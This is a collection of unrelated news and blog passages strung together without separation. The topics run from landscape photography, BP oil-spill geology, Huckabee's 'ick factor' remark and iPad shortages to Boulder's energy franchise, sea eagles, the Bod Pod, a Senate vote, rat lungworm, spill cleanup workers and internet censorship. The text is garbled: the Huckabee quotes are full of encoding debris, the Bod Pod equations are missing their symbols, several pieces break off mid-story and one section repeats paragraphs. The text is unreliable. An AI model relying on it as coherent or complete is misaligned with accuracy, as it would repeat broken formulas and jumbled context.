There are so many twists , turns , peaks , valleys , and utterly strange shapes here that it ’s hard to make a traditional landscape or abstract composition work .
This forces you to think outside the box photographically .
Like most landscapes , early morning and evening offer the best light .
If you go between October and March , you may be lucky enough to have pools of water to photograph as well .
On my most recent visit , I spent my time in the hard mid-day light exploring the surrounding area .
This was an excellent exercise which only left me yearning for more exploration .
I was able to hike up to the highest point in the general area – just east of the White Pocket , and take This Panorama of the landscape from atop a huge sandstone cliff .
Although not a technically great shot , it ’s unique and pretty interesting as it shows a seldom - seen view of this location , looking down onto the White Pocket from above .
I have made some ‘ snapshots ’ that work with the interface of the Gigapan site so that you can get a better idea of how the landscape is spread out .
When you look at the broad landscape from any high vantage point in the White Pocket , you will see Coyote Buttes North , Buckskin Gulch , and countless unnamed and largely unphotographed rock formations tossed throughout the Paria Plateau .
This scene makes me want to spend a few weeks backpacking in the area , simply exploring – photography being secondary .
One thing to remember is how extremely delicate the terrain here is .
Please be careful where you tread .
A misplaced foot can crumble a formation that took millions of years to form .
White Pocket is one of those places that leaves you wanting more …
When the light was poor , I found myself simply enjoying the scenery and the immortal feeling of this remote place .
So much time ( hundreds of millions of years ) has gone into creating this place and it ’s a privilege to be able to enjoy it in this relatively untainted state without the rush of a highway buzzing in the distance or any other man-made distractions .
Places like this still exist in the United States and I suggest going there and experiencing it for yourself if you ’re anything like me .
Just do n’t forget your camera and plenty of water …
As for me , I ’m already scheming on when I can steal away and get back out there …
Thanks for reading

The government failed to properly ensure that BP used adequate safety measures , BP and their contractors were criminally negligent for the oil spill , and BP has tried to cover up the problem .
See this .
But why has n't BP stopped the leak ?
Some people assume that BP has n't stopped the oil leak because it 's people are wholly incompetent .
Others have asked whether BP's $ 75 million liability cap is motivating it to stall by taking half - hearted measures until it 's relief well drilling is complete .
But there is another possible explanation : the geology at the drilling site makes stopping the leak more difficult than people realize .
Does the Geology of the Spill Zone Make It Harder to Stop the Oil Spill ?
We can't understand the big picture behind the Gulf oil spill unless we know the underwater geology of the seabed and the underlying rocks .
For example , if there is solid rock beneath the leaking pipes , with channels leading to other underground spaces , then it might be possible to seal the whole spill zone , with the oil - hopefully - oozing somewhere under the seabed so that it wo n't spill into the ocean .
If , on the other hand , there is hundreds of feet of sand or mud beneath the leaking pipes , then sealing the spill zone might not work , as the high - pressure oil gusher would just leak out somewhere else .
BP has never publicly released geological cross-sections of the seabed and underlying rock .
BP 's Initial Exploration Plan refers to " structure contour maps " and " geological cross sections " , but such drawings and information are designated " proprietary information " and have been kept under wraps .
It is impossible to determine the geology from drawings publicly released by BP , such as this one :
However , Roger Anderson and Albert Boulanger of Columbia University 's Lamont - Doherty Earth Observatory describe the basic geology of the oil - rich parts of the Gulf :
Production in the deepwater province is centered in turbidite sands recently deposited from the Mississippi delta .
Even more prolific rates have been recorded in the carbonates of Mexico , with the Golden Lane and Campeche reporting 100,000 barrel per day production from single wells .
However , most of the deep and ultra- deepwater Gulf of Mexico is covered by the Sigsbee salt sheet that forms a large , near - surface “ moonscape ” culminating at the edge of the continental slope in an 800 meter high escarpment .
***
Salt is the dominant structural element of the ultra - deepwater Gulf of Mexico petroleum system .
Large horizontal salt sheets , driven by the huge Plio - Pleistocene to Oligocene sediment dump of the Mississippi , Rio Grande and other Gulf Coast Rivers , dominate the slope to the Sigsbee escarpment .
Salt movement is recorded by large , stepped , counter - regional growth faults and down - to - the - basin fault systems soling into evacuated salt surfaces .
Horizontal velocities of salt movement to the south are in the several cm / year range , making this supposedly passive margin as tectonically active as most plate boundaries .
***
Porosities over 30 percent and permeabilities greater than one darcy in deepwater turbidite reservoirs have been commonly cited .
Compaction and diagenesis of deepwater reservoir sands are minimal because of relatively recent and rapid sedimentation .
Sands at almost 20,000 feet in the auger field ( Garden Banks 426 ) still retain a porosity of 26 % and a permeability of almost 350 mdarcies .
Pliocene and Pleistocene turbidite sands in the Green Canyon 205 field have reported porosities ranging from 28 to 32 % with permeabilities between 400 mdarcies and 3 darcies .
Connectivity in sheet sands and amalgamated sheet and channel sands is high for deepwater turbidite reservoirs and recovery efficiencies are in the 40 - 60 % range .

The BP oil spill leak is occurring in the " Macondo " Prospect , Block 252 , in the Mississippi Canyon Area of the Gulf ( much of the oil - rich areas under the Gulf are in the Mississippi Canyon and Fan areas : " In the central Gulf of Mexico , the Mississippi Canyon and Fan system is the dominant morphologic feature " ) .
If the geology at Block 252 of the Macondo Prospect is like that described by Anderson and Boulanger for most of the oil - rich portion of the Gulf , then it might be difficult to stop the oil gusher without completing relief wells ( which will take a couple of months ) .
Specifically , if there are salt layers on the top of the seabed , with high porosity near the surface , and salt movement , then sealing the whole leak zone might not work .
The oil pressure is coming up at such high pressures ( more than 2,000 pounds per square inch ) , that sealing the leaking riser and blowout preventer might just mean the oil squirts out somewhere else nearby , if the salty , porous rock is not solid enough to contain it .
Unless the government releases details of the geology underlying the spill site , people will not have an accurate picture of the oil spill situation .
And failure to release such information may prevent creative scientists from coming up with a workable solution .
The first draft of Anderson and Boulanger 's paper , in 2001 , stated :
No means currently exists to produce oil and gas to market from such water depths !
( exclamation point is Anderson and Boulanger 's ) .
If the geology at Block 252 is like that described by Anderson and Boulanger for most of the oil - rich portion of the Gulf , then it might be difficult to stop the oil gusher without completing relief wells ( which will take a couple of months ) .
Specifically , if there are salt layers right under the sea floor , high porosity near the surface or salt movement , then sealing the leak by plugging the risers and blowout preventer might not work .
The oil pressure is coming up at such high pressures ( more than 2,000 pounds per square inch ) , that sealing the leaking equipment at the level of the seabed might just mean the oil will flow out somewhere else nearby .
The government must publicly release details of the geology under the spill site .
Until it does so , people will not have be understand what is going on .
And failing to release such information may prevent creative scientists from around the world from coming up with a workable solution .
In addition , the first draft of Anderson and Boulanger 's paper - released in 2001 - stated :
No means currently exists to produce oil and gas to market from such water depths !
( exclamation point is Anderson and Boulanger 's ) .
In other words , while BP , its subcontractors , and the government were all negligent with regard to the Deepwater Horizon operation , it should be noted that drilling at such depths is new technology , operating in largely uncharted conditions .
As such , the dangers of deepwater drilling in general should not be underestimated .
The geology of the oil - rich region in the Gulf makes drilling difficult , and oil spills appear to be tough to contain in general .
Oil Is Considered A National Security Issue
So why are oil companies being allowed to drill so deeply under the Gulf in the first place ?
In other words , why has the government been so supportive of deepwater drilling in the Gulf ?
The answer - as Anderson and Boulanger note - is that there is a tremendous amount of more oil deep under the Gulf , and that the United States government considers oil drilling in the deep waters of the Gulf as a national security priority :
The oil and gas industry and the United States government both face tremendous challenges to explore discover , appraise , develop , and exploit vast new hydrocarbon reserves in waters deeper than 6000 feet in the ultra- deepwater of the Gulf of Mexico .
Yet these new reserves of hydrocarbons are needed to offset the economically detrimental , long - term decline in production from within the borders of the United States
***
If successfully developed , the new play concept would fill an essential gap in the overall strategic defenses of the United States by decreasing the gap that results in the nation 's dependence on foreign oil and gas reserves in this volatile and hostile , post 9/11 world .
However , the successful production of oil and gas from this new carbonate play concept requires much more cost - efficient evaluation and appraisal technologies than exist today to economically conduct exploration , appraisal , and development activities .
These new technologies must be developed before production can be practical in the ultra - deepwater operating environment ....
The Ultra-Deepwater and Unconventional Gas Trust Fund of the DOE has as its mission to cut costs and time - to - market not incrementally , but radically , so that the United States can optimally utilize these strategic hydrocarbon reserves .
The DOE , with extensive industry , academic and non-governmental assistance , developed an Offshore Technology Roadmap ... ,
***
The U. S. Energy Bill of 2002 has allocated significant resources to fund innovative industry , academic , and national laboratory research initiatives to develop the new technologies necessary to explore and produce these new ultra - deepwater reserves economically .
The purpose is not only to impact the national defense , but also to regain our international technological leadership in the deepwater , recently lost to the Brazilians , Norwegians , and Europeans .
***
Congress , never a big friend to energy interests , has acted to create the Ultra - deepwater Trust Fund that would add an astounding $ 200 billion by 2017 , if successful at developing the new production technologies required .
So the Department of Energy and Congress have committed to development of the deepwater Gulf oil reserves in the name of national security .
This also helps explain why Obama has been pro-drilling in the Gulf .
But let 's take a step back and ask why the government considers oil a national security priority in the first place ?
Well , the U.S. military is the largest consumer of oil in the world .
As NPR reported in 2007 :
All the U.S. tanks , planes and ships guzzle 340,000 barrels of oil a day , making the American military the single - largest purchaser and consumer of oil in the world .
If the Defense Department were a country , it would rank about 38th in the world for oil consumption , right behind the Philippines .
As Reuters pointed out in 2008 :
U.S. military fuel consumption dwarfs energy demand in many countries around the world , adding up to nearly double the fuel use in Ireland and 20 times more than that of Iceland , according to the U.S. Department of Energy .
And as I summarized last year :
Sara Flounders writes :
By every measure , the Pentagon is the largest institutional user of petroleum products and energy in general .
Yet the Pentagon has a blanket exemption in all international climate agreements .
*** The Feb. 17 , 2007 , Energy Bulletin detailed the oil consumption just for the Pentagon 's aircraft , ships , ground vehicles and facilities that made it the single - largest oil consumer in the world .
***
Even according to rankings in the 2006 CIA World Factbook , only 35 countries ( out of 210 in the world ) consume more oil per day than the Pentagon .
***
As I pointed out out last week : Professor Michael Klare noted in 2007 : Sixteen gallons of oil .
That 's how much the average American soldier in Iraq and Afghanistan consumes on a daily basis -- either directly , through the use of Humvees , tanks , trucks , and helicopters , or indirectly , by calling in air strikes .
Multiply this figure by 162,000 soldiers in Iraq , 24,000 in Afghanistan , and 30,000 in the surrounding region ( including sailors aboard U.S. warships in the Persian Gulf ) and you arrive at approximately 3.5 million gallons of oil : the daily petroleum tab for U.S. combat operations in the Middle East war zone .
And in 2008 , Oil Change International released a report showing that [ b ] etween March 2003 and October 2007 the US military in Iraq purchased more than 4 billion gallons of fuel from the Defense Energy Support Center , the agency responsible for procuring and supplying petroleum products to the Department of Defense .
Indeed , Alan Greenspan , John McCain , George W. Bush , Sarah Palin , a high - level National Security Council officer and others all say that the Iraq war was really about oil .
Nobel prize winning economist Joseph Stiglitz says that the Iraq war alone will cost $ 3 - 5 trillion dollars .
And economist Anita Dancs writes :
Each year , our military devotes substantial resources to securing access to and safeguarding the transportation of oil and other energy sources .
I estimate that we will pay $ 90 billion this year to secure oil .
If spending on the Iraq War is included , the total rises to $ 166 billion .
Are you starting to get the picture ?
In addition , experts say that the Iraq war has increased the threat of terrorism .
See this , this , this , this , this , this and this .
Personally , I strongly believe that it is vital for our national security - and our economy - to switch from dependence on oil to a basket of alternative energies .
As I pointed out Friday :
It 's not just the one BP oil rig .
For example , since the Deepwater Horizon oil drilling rig exploded on April 20th , the Obama administration has granted oil and gas companies at least 27 exemptions from doing in - depth environmental studies of oil exploration and production in the Gulf of Mexico .
Then there are the 12 new oil and gas drilling rigs launched in the U.S. this week .
And a whistleblower who survived the Gulf oil explosion claims in a lawsuit that BP 's operations at another oil platform risk another catastrophic accident that could " dwarf " the Gulf oil spill , partly because BP never even reviewed critical engineering designs for the operation .
And see this .
***
And the Department of Defense also apparently has some issues with extensive off - shore drilling for security reasons .
Many still believe that alternative energy is an expensive , unrealistic pipe dream .
But that is no longer necessarily true , especially when the externalities of environmental and military costs are taken into account .
But existing national policy is to do whatever is necessary - drilling deep under the Gulf and launching our military abroad - to secure oil .
Until we change our national security and energy policies , future mishaps - environmental , military and economic - may frequently occur .

Mike Huckabee has said he believes there is an “ ick factor ” to homosexuality .
The former Arkansas governor defended his remarks Sunday by saying he was n’t the first to use the term .
Huckabee said he got the term from University of Chicago professor Martha Nussbaum — but Nussbaum says she never used or coined the term .
In a recent interview with The New Yorker magazine , Ariel Levy asked Huckabee to explain his opposition to gay rights .
ADVERTISEMENT
Ã¢â‚ ¬Å“ I do believe that God created male and female and intended for marriage to be the relationship of the two opposite sexes , Ã¢â‚ ¬ Â  he said .
Ã¢â‚ ¬Å“ Male and female are biologically compatible to have a relationship .
We can get into the ick factor , but the fact is two men in a relationship , two women in a relationship , biologically , that does nÃ¢â‚¬â „ ¢t work the same .
Ã¢â‚ ¬Â I asked him if he had any arguments that did nÃ¢â‚¬â „ ¢t have to do with God or ickiness .
Ã¢â‚ ¬Å“ There are some pretty startling studies that show if you want to end poverty itÃ¢â‚¬â „ ¢s not education and race , itÃ¢â‚¬â „ ¢s monogamous marriage , Ã¢â‚ ¬ Â  he said .
Ã¢â‚ ¬Å“ Many studies show that children who grow up in a healthy environment where they have both a mother and a father figure have both a healthier outlook and a different perspective from kids who donÃ¢â‚¬â „ ¢t have the presence of both .
Ã¢â‚¬Â 
Human Rights Campaign Vice President Fred Sainz said Huckabee ’s comments were “ no surprise from a man who is consistently wrong and uninformed . ”
Sainz told Politico :
Ã¢â‚ ¬Å“ Ick is being fired from a job , being the victim of a hate crime or being bullied at school simply because you are lesbian , gay , bisexual or transgender , Ã¢â‚ ¬Â Sainz added .
Ã¢â‚ ¬Å“ And ick is certainly an appropriate way to describe Mr. HuckabeeÃ¢â‚¬â „ ¢s mind going to sex when all that we are asking for is our equality .
Ick indeed .
Ã¢â‚¬Â
Speaking to Fox News ’ Chris Wallace Sunday , Huckabee implied that his use of the term was acceptable because it had once been used in a gay magazine .
“ That term comes from a gay magazine called The Edge in which the author , Joseph Erbentraut , interviewed professor Martha Nussbaum from — one of Barack Obama ’s colleagues [ from ]
The University of Chicago .
She uses a term ‘ projected disgust . ’
He , in the interview , coined this phrase .
It ’s in the article that he wrote .
It ’s in the interview with her .
That phrase was not mine .
It is actually a phrase that exists within the gay community .
But somehow it is okay if they talk about it but if someone else talks about it , it is off bounds , ” explained Huckabee .

But Nussbaum claims that she never used the term “ ick factor ” when talking about gay issues .
“ I have never used the phrase ‘ ick factor ’ in any of my three books dealing with the emotion of disgust , or in any articles , ” Nussbaum said in an email quoted by news sources .
“ I use the term ‘ projective disgust ’ to characterize the disgust that many people feel when they imagine gay sex acts . ”
She continued , “ Projective disgust has its origin in a discomfort with one ’s own body … including sexuality , and that , in a defense mechanism , disgust is then projected outward onto vulnerable groups who are characterized as hyperphysical and hypersexual .
In this way , the uncomfortable people displace their discomfort onto others , who are then targeted for various forms of social discrimination . ”

Gov. Huckabee “ owes me a public apology , ” Nussbaum concluded .

Over the course of last week we have been getting reports of the iPad being unavailable at an increasing number of locations .
In some locations there were no 3G devices available while in others there were simply no iPads of any model .
An acquaintance of mine that traveled through several US cities a week ago could not get an iPad in three different cities and only upon stopping for a couple days in Florida did he manage to track down a store in a near by town that had iPads for sale .
In the international arena the ship dates for iPads being pre-ordered has already been pushed back into June as demand out paces supply all around .
It seems that Apple may have underestimated demand for the device all around and though it has been mentioned that a third group of countries to receive the iPad will be announced , Apple just want to slow down the increase in the number of countries it is shipping iPads too , if they ca n’t meet demand to be had in the domestic market and in the countries where they will be releasing the iPad next week .
On the other hand having the iPad present in other markets , even if in diminished quantity , might be enough to help undermine efforts by other computer manufacturers aiming to bring tablets to the market still within the year as some users might choose to wait a few weeks to receive their iPads if they know they have the option of ordering it .
Depending on how long it takes for a major manufacturer to release a competing product there might be chance for good penetration in markets that Apple did not choose , or is unable to supply with iPads in the near future .
As more people manage to buy iPads and more information about their usage is made available , more people become aware of the benefits of the form factor .
In the end , if Apple is not able to ramp up production of the iPad quickly to move into more markets , repressed demand for the iPad might translate in demand for other tablet devices in the markets that are not being served .

At the end of the year , the 20 - year franchise agreement between the city of Boulder and Xcel Energy will expire .
The agreement is actually a relatively mundane technical document that gives access to the city ’s rights of way so the company can sell and distribute electricity and natural gas to all residents .
In return , Xcel pays Boulder about $ 4 million , which it collects from Boulder customers , as a “ franchise fee . ”
In the past , renewal of the franchise agreement — which must be approved by voters — has been a mostly procedural task .
But this year , opposition to the franchise has built among Boulder residents who believe the city should be moving away from using fossil fuels as an energy source faster than Xcel .
City staffers agree that Boulder needs to add more renewable energy to its fuel mix in order to meet its long - term greenhouse gas reduction goals , but they have n’t decided the best way to make that happen .
The city ’s options for increasing renewable energy
Sticking with Xcel :
The franchise agreement , as defined by state regulations , cannot actually address where Boulder ’s energy comes from — whether that be a specific coal plant or a wind farm .
But the franchise agreement , which essentially commits Boulder to using Xcel as its energy provider , offers the city an opportunity to negotiate other side agreements with Xcel .
The city can , essentially , refuse to enter into another 20 - year franchise agreement unless Xcel makes other commitments , which could include helping Boulder “ decarbonize ” its energy supply .
If the city sticks with Xcel , which would require voter approval in November , the city also retains the $ 4 million generated by the franchise fee annually , which goes into the city ’s general fund .
The franchise agreement would give the city an opportunity to create a municipal utility after 10 or 15 years .
But critics of the franchise say that if the city chooses to drop its commitment to Xcel once its signed a franchise , Boulder residents may be on the hook to pay for a portion of any power plants that Xcel builds in anticipation of providing electricity to Boulder for the full 20 years .
Going it alone :
If the City Council decides to let the franchise agreement expire — or if voters turn down a franchise renewal in November — state regulations require that Xcel continue to provide electricity and natural gas service to Boulder residents .
But Xcel says it will no longer have the authority to collect the franchise fee .
The city can replace the revenue generated by the franchise fee by adding an excise tax on electricity sales , which would be calibrated to provide the same amount of revenue .
This excise tax would also have to be approved by voters , and could be worded to only take effect if the franchise expires .
Once Boulder is free of the franchise agreement , the city could choose to start its own municipal utility , which would require buying Xcel ’s infrastructure — including power lines and electricity meters — from Xcel .
The city could also choose to lobby the state legislature to make “ retail wheeling ” legal .
This concept would allow the city to buy its own electricity from bulk providers , such as wind farms and solar plants , and have the power delivered over Xcel ’s infrastructure .
The compromise : Ideally , city staffers say they ’d like Xcel to extend the current franchise agreement for two years so that the city and Xcel could jointly do a decarbonization study .
While Xcel has extended the franchise from its original expiration on Aug. 3 to the end of the year , the company has so far refused to consider extending it beyond 2010 .
Pros and cons
What franchise supporters say : Sticking with Xcel may be the cheapest and most reliable option .
Creating a municipal utility — which has n’t been done in Colorado for more than a decade — would likely take years and could be expensive .
If the city lets the franchise agreement expire — or if voters turn down both the agreement and a new excise tax — the city could be out $ 4 million , which could cause significant cuts to basic city services .
If the city wants to decarbonize faster than Xcel , it can buy a bulk purchase of Windsource credits from Xcel .
What franchise opponents say : If Boulder signs on to another 20 - year agreement with Xcel , a profit - driven company that does not have Boulder ’s needs at heart , the city will never cut its carbon footprint at the rate desired by citizens and outlined in the Climate Action Plan .
Now , Xcel has just opened a new coal plant in Pueblo , ensuring that coal remains a major part of Xcel ’s portfolio for decades to come .
And while the company is relatively green , compared to other large utilities , it has mostly made those changes kicking and screaming .
For example , the company originally opposed Amendment 37 , which created a renewable energy standard for Xcel .
Purchasing Windsource credits is not a viable long - term solution , in part because once the cost of renewable energy falls below coal , the program will have to be limited to keep everyone from switching over to it .
Xcel also has a checkered past , at one point selling more kilowatts of wind power than it owned .
If you go
What : A city - sponsored open house on Boulder ’s energy future .
Representatives from the city , Xcel Energy and the citizen Decarbonization Tech Team will be present .
When : 6 to 8 p.m. Tuesday
Where : Commons in the East Boulder Senior Center , 5660 Sioux Drive

A batch of white tailed eagle chicks have arrived in Edinburgh as part of an initiative to reintroduce the species to the east of the country .
The 19 chicks were welcomed at Edinburgh Airport by Environment Minister Roseanna Cunningham .
They will stay at purpose - built aviaries at a secret location in Fife until they have developed their flight feathers .
The eagles are known as " flying barn doors " due to their 8ft wing span .
The five - week - old chicks arrived in Edinburgh on Friday from Norway .
All of this is of course about protecting and restoring our biodiversity Roseanna Cunningham , Environment Minister
Ms Cunningham said : " The white tailed sea eagle was lost to Scotland in the past and we have a duty to re-establish its presence here .
" The East of Scotland project is building on what has already been achieved in the west for this amazing species , where it has become a huge tourist attraction .
" All of this is of course about protecting and restoring our biodiversity ; something that is everyone 's responsibility and to everyone 's benefit . "
The project comes after successful reintroductions in the west of Scotland since the 1970s .
Claire Smith , RSPB Scotland 's sea eagle project officer , said : " Since the project started in 2007 we 've had over 2,000 sightings of these wonderful birds .
" Our chicks from 2009 have been spotted across north east Scotland , as well as Fife , Angus , and Tayside , while earlier this year , much to the delighted of visitors to our Vane Farm nature reserve , three sea eagles spent three months roosting on islands on Loch Leven .
" We 're also thrilled to learn our populations are starting to mix , not only with birds in the west of Scotland , but also those who are part of the Irish reintroduction . "
Britain 's largest bird of prey disappeared from the UK in Victorian times as a result of human persecution .

" LULU is a serious work .
But one in no way pompous .
The story explores the power dynamic of sex and gender .
Dark undercurrents pervade it .
It requires and assumes emotional intelligence of its reader – and an understanding of the medium skilfully employed to tell it ...
Generally these days most comic books fail to enthuse me .
It ’s not the medium it ’s the message .
More power to John Linton Roberson for ploughing his deviant furrow . "

The Bod Pod .
Researchers are working to understand the effect that dietary interventions have on body composition and biological parameters of cardiovascular risk , and how molecules produced by fat tissue influence cancer development .
" Knowing how a person 's fat distribution and quantity influence the development of these diseases and how dietary interventions can affect weight and cardiovascular risk is essential to prevent a global epidemic of obesity - related disease " , says Dr Giovanna Bermano from the Institute for Health and Welfare Research and the Centre for Obesity Research and Epidemiology ( CORE ) , Robert Gordon University .
Bermano and her team are behind one of the exhibits at this year 's Royal Society Science Summer Exhibition .
Part of their exhibit is the Bodpod , which allows visitors to step inside and have their body composition measured .
To determine our body composition , we need to know how much of our bodies are made up of fat , and how much is other fat - free tissues such as muscle and bone .
Luckily , measuring this does n't require any medical procedures — all you need to know is how dense you are .
’ The Bod Pod measures how much air your body displaces to find your volume ( similar to the way the water rises when you hop into the bath ) and uses an electronic scale to measure your weight .
It uses these values to calculate the percentage of your body which is made up of fat .
The equation
calculates the overall density , of your body .
Your body ’s total volume , , is made up of fat and fat - free tissue :
which can be rewritten in terms of mass , , and density , , using the density equation :
The density of the fat , , in our bodies is very different from the density of the other fat - free tissues , , because muscles and bones are heavier than fat .
Dividing both sides of the last equation by your total mass , , gives
where is the proportion of your body mass that is made up of fat .
This equation can be rearranged to give :
where the values and depend only on the densities of fat and fat - free tissue .
The Bod Pod uses this equation to calculate your percentage body fat which is simply
It uses estimates of and from past experimental research .
For the general population and are used , but these values can vary according to your age , gender or race .
This article is based on the Maths Inside project , a collaboration of Plus and the Mathematics Promotion Unit ( run by the London Mathematical Society and the Institute of Mathematics and its Applications ) , in conjunction with the Fat body slim exhibit and the Royal Society .

Nexus
One owners are reporting early Froyo updates already , but chances are , you do n't own a Nexus One .
Any mobile OS with apps has an SDK — a developer kit — which gives devs the tools needed to create and test apps for the platform .
And any good SDK comes with an emulator for the OS itself , so devs can test apps without actually installing them on a phone .
Apple 's got one , but it only works on Macs .
Microsoft 's got one , but it only works on PCs .
Google 's Android emulator , on the other hand , works on any platform , and it 's totally free .
Here 's how to load up Android Froyo on your desktop in just a few minutes .

The Democrats mustered the 60 - vote minimum needed to avoid a possible Republican filibuster , after falling three votes short Wednesday .
The vote was 60 - 40 .
Democrats control 58 seats and can usually count on the support of independent Bernie Sanders of Vermont .
They typically need only one Republican to vote with them .
In this case , three GOP senators voted with them , approving cloture .
The Senate will now consider a few remaining amendments , which based on Senate rules must be considered germane to the overall bill .
After that , and regardless of the outcome of any amendment votes , a final vote will be held .
Approval is widely expected .
How The Vote Changed
The GOP members voting for cloture were : Susan Collins and Olympia Snowe of Maine , who voted in favor of cloture Wednesday ; and the newly - elected Scott Brown of Massachusetts .
Brown was expected to vote with the Democrats yesterday but changed his mind over lingering concerns about how some of the too - big - to - fail provisions might affect big mutual fund firms in his state , such as Fidelity .
Since then , Brown was given " some assurances .... to get him back on board , " said one senior Congressional staffer familiar with the conversations , adding that lawmakers did not see the fund firms as presenting a risk to the financial system .
Another difference in the outcome was that Democrat Arlen Specter , who was absent for Wednesday 's vote having remained in Pennsylvania following his primary defeat in Tuesday ; voted yes along party lines .
Democrats Maria Cantwell of Washington and Russell Feingold of Wisconsin , who broke with their party and voted no Wednesday , once again voted against cloture .
Cantwell is said to be among the many members frustrated by the fact that only a small percentage of the 300 amendments filed have been debated and voted on .
She has offered two amendments , but neither of which had been taken up .
A SYDNEY man is critically ill after eating a slug as a dare , leading authorities to issue health warnings on devouring raw gastropods .
The 21 - year - old contracted rat lungworm disease - a rare form of meningitis - after the stunt .
Rat lungworm disease is caused by Angiostrongylus cantonensis , a parasitic worm that is carried in the pulmonary arteries of rats .
Larvae are excreted in the rat 's droppings , which are often eaten by slugs and snails .
The disease can cause fatal swelling of the brain and spinal cord .
However , Jeremy McAnulty from New South Wales Health said most people do recover .
He said the worm goes away by itself because the body 's immune system eventually gets rid of it .
Dr McAnulty said people should not eat raw slugs or snails and should ensure they wash their hands after touching them .
" It is also important to thoroughly wash and cook any produce that could be contaminated by animals , " he said .
The worm was found mainly in Asia and the Pacific Islands .
It was rare for people to contract rat lungworm disease in Australia , but it occurred occasionally from eating an uncooked slug or snail , Dr McAnulty said .
Infected people may have no symptoms or only mild short - lived symptoms , he said .
Sometimes the infection causes meningitis , with symptoms such as headaches , stiff neck , tingling or pain in the skin , fever , nausea , and vomiting , Dr McAnulty said .
" Even if infected , most people recover fully without treatment , " he said .
" However , it can sometimes cause severe meningitis .
" Because humans are not the natural host of the parasite , the parasite eventually dies without treatment . "
Rat lungworm infection cannot be passed on to other people .
Spill cleanup workers face labor - camp conditions
By Andre Damon and C.W. Rogers in Louisiana
23 June 2010
Among the many victims of the BP spill are the thousands of cleanup workers hired by the company and contractors to lay boom , operate skimmer boats and comb beaches for oil .
Cleanup workers in Gulf Shores , Alabama
The workers come from all over the United States — as far away as Alaska — and are of dozens of nationalities .
Many do not speak English .
Many have taken jobs cleaning up oil due to the very high unemployment rate — these are some of the only jobs available .
The beach cleanup workers work on the shores in dozens , handling toxic oil without full protective gear , breathing poisoned air and suffering dehydration and heat strokes under the hot sun .
Over the past week , temperatures in Southern Louisiana have averaged over 90 degrees .
Many are concerned about falling ill from exposure to oil and dispersant .
“ I just want to work and get my paycheck ; I do n’t want to get sick from this , ” said one worker , who asked to remain anonymous because he will lose his job for speaking to the media .
“ I ’m concerned about my health . ”
Cleanup employees were regularly having their wages withheld from them at some companies , according to a lead cleanup worker in Grand Isle , Louisiana , who asked to remain anonymous .
“ We had our wages held for days on end last week , ” the worker said in an interview on Saturday .
“ They do this every time ; they hold the wages and bank the money , ” he said .
A cleanup worker in Gulf Shores , Alabama
For the past two pay periods , Louisiana - based Ashland Services LLC , the labor contractor he works for , has given workers the same story .
“ Every pay period , they blame the late payments on the payroll company .
But of course they do n’t tell us the name of the company ; that ’s because it ’s a lie ; payroll companies do n’t make those types of mistakes . ”
“ Last week there was almost a riot , ” he added .
“ They have 600 people to pay and they only had 28 checks , ” he said .
“ They had to call in the buses early and get everyone back to the tent city where we ’re staying before it got out of control .
They told everyone that checks would be waiting for them there but that was a lie too . ”
BP gives the companies that hire cleanup workers a lump sum for the job , based on how much they think it will cost , he said .
“ They just bank the cash and pay the workers late to get some extra off the top . ”
Cleanup workers wait out a thunderstorm in Gulf Shores , Alabama
Some workers have been fired before the end of the pay period , without getting a single paycheck or having enough money to get home .
When this happened to one worker , her fellow employees , not the contractor , took care of her .
“ We all pooled in enough money for her to buy bus tickets back , ” said the worker .
“ It ’s just chaos down here , ” he said .
“ We ’ve had people working for weeks , and all of a sudden they ’re told they ’re not even hired ; Ashland says they have no record of them working and do n’t have their work applications .
People are told to re-file applications over and over .
They find every possible way to scam you out of your pay . ”
“ One girl I work with was told to re-file her application five times .
This is a contracting company ; how can you lose that many applications ?
How can you not take care of your people ? ” he said .
“ It ’s not like it ’s getting better , it ’s getting worse . ”
BP has subcontracted nearly all recovery activities to private contractors like Ashland Services .
The workers on Grand Isle , Louisiana , are being paid as little as $ 12 an hour , and are forced to provide their own transportation to and from the region .
“ I ’ve worked with these disaster - relief companies before , ” said Dean Blanchard , owner of a shrimp processing and distribution company in Grand Isle , Louisiana .
“ The worse it is , the more money they get .
Their modus operandi is , let [ the disaster ] get as big as it can , then go to the bank , ” he said .
The local fishermen brought in to clean up the spill face their own set of problems .
They must stand idly by while the oil spill destroys the shores and bayous that have sustained their families for generations .
Walter , a skimming boat captain from Charleston , South Carolina , said that skimming is ineffective .
“ We ’re barely doing anything .
Out of 150 million gallons , we have n’t picked up two million , ” he said .
“ They deliberately sunk all the oil to the bottom as a PR move .
There just is n’t much for us to skim . ”
John , a cleanup worker for BP from Missouri , said that a boat with six men can work a whole day , and only gather fifteen gallons of oil .
Dean Blanchard has seen even worse figures , with some of the shrimping boats he works with reporting that they gathered only 4 - 5 gallons per day .
Kevin , a shrimper from Venice , said he was now doing cleanup work because no other work was available .
“ There will be nothing back here when this is over ; I doubt they will ever get this well capped , even after they drill the relief wells . ”
“ I should be out there on the bayou .
I got my boat all ready , and I ’ve got nothing left , ” he said .
Kevin said that his job is comparatively easy , since he works in air and water sampling .
“ My father has been on a skimming boat offshore for fifty days , without even a day on land to stretch his legs , ” he said .
“ The government should just pay cleanup workers by the gallon , or at least give them the ability to decide how they want to fight the spill , ” said Blanchard .
“ The fishermen are fishers of the sea ; they can catch anything ; be it shrimp or anything else , ” said Blanchard .
“ They are simple people , but they know what they ’re doing .
Now , they ’re being hired to do nothing . ”
Swedish EU Commissioner Cecilia Malmström wants to introduce ” filtering ” of the Internet , to block sites that are accused of spreading child pornography .
She believes this would be an effective way to reduce sexual child abuse in the world .
I and The Pirate Party disagree with her , and think that censorship of the Internet is a bad idea .
If there are sites on the net that are illegally distributing pictures of sexual child abuse , we think that the sites should be shut down and the perpetrators put in jail , after a proper trial .
But we do not accept censorship that is carried out in secrecy and without due process .
A couple of weeks ago , on April 7 , I got the chance to have a debate about this proposal for Internet censorship with Cecilia Malmström on Swedish radio .
The debate was in Swedish , but I have translated it here from the transcript in Swedish that some net activists did .
The radio program started with an interview with a policeman from the Swedish Police ’s Child Pornography Group , who first gave some background about the system that is in place in Sweden since 2005 .
I have not translated that part , so I ’ll summarize the background .
Sweden has a ” voluntary ” system for blocking , where the major internet service providers block certain sites according to a list supplied by the police and updated regularly .
If your computer tries to go to a web site that is on the list , it will be redirected to a stop page .
The policeman from the Child Pornography Group said that the stop page has about 50,000 hits per day .
( This number has since been put in question . )
He confirmed that it is technically relatively easy to circumvent the blocking , but he did not think that it is very common that people who want to access these pages know how to do it .
He mentioned Ukraine as a big distributor of child pornography , but also said that many of the servers are located in the US .
After this introduction , it was time for the debate between Ms. Malmström and me .
In the translated version here , I have added links to references for some of the things that were said in the debate .
